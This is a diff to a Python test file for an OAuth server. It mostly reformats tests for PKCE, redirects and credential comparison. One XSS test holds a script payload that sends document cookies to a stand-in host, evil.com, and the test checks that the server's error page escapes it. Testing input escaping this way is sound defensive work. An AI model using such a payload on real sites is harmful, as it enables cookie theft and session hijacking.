@@ -99,7 +99,11 @@ def generate_pkce_pair():
     import secrets
 
     verifier = secrets.token_urlsafe(32)
-    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode("ascii")).digest()).rstrip(b"=").decode("ascii")
+    challenge = (
+        base64.urlsafe_b64encode(hashlib.sha256(verifier.encode("ascii")).digest())
+        .rstrip(b"=")
+        .decode("ascii")
+    )
 
     return verifier, challenge
 
@@ -349,7 +353,10 @@ class TestAuthorization:
         )
 
         assert response.status_code == 302
-        assert "PKCE" in response.headers.get("location", "").lower() or "code_challenge" in response.headers.get("location", "").lower()
+        assert (
+            "PKCE" in response.headers.get("location", "").lower()
+            or "code_challenge" in response.headers.get("location", "").lower()
+        )
 
     def test_authorize_invalid_redirect_uri(self, client):
         """Test authorization fails with unregistered redirect_uri."""
@@ -488,8 +495,12 @@ class TestAuthorization:
 
         # Verify the comparison included the credentials
         compared_values = [call[0] for call in compare_digest_calls]
-        assert "admin" in compared_values, "Username should be compared with compare_digest"
-        assert "testpass" in compared_values, "Password should be compared with compare_digest"
+        assert (
+            "admin" in compared_values
+        ), "Username should be compared with compare_digest"
+        assert (
+            "testpass" in compared_values
+        ), "Password should be compared with compare_digest"
 
         # Should still succeed with valid credentials
         assert response.status_code == 302
@@ -742,7 +753,7 @@ class TestXSSProtection:
             f"{API_V1}/oauth/register",
             json={"redirect_uris": ["http://localhost/callback"]},
         )
-        client_id = reg_response.json()["client_id"]
+        reg_response.json()["client_id"]
 
         _, challenge = generate_pkce_pair()
 
@@ -763,11 +774,15 @@ class TestXSSProtection:
         """Test that error page messages are HTML-escaped."""
         from valence.server.oauth import _error_page
 
-        xss_payload = '<script>document.location="http://evil.com?c="+document.cookie</script>'
+        xss_payload = (
+            '<script>document.location="http://evil.com?c="+document.cookie</script>'
+        )
         html_output = _error_page(xss_payload)
 
         # The raw XSS payload should NOT appear
         assert xss_payload not in html_output
         # The escaped version should appear
         assert "&lt;script&gt;" in html_output
-        assert "evil.com" in html_output  # The text content is still there, just escaped
+        assert (
+            "evil.com" in html_output
+        )  # The text content is still there, just escaped
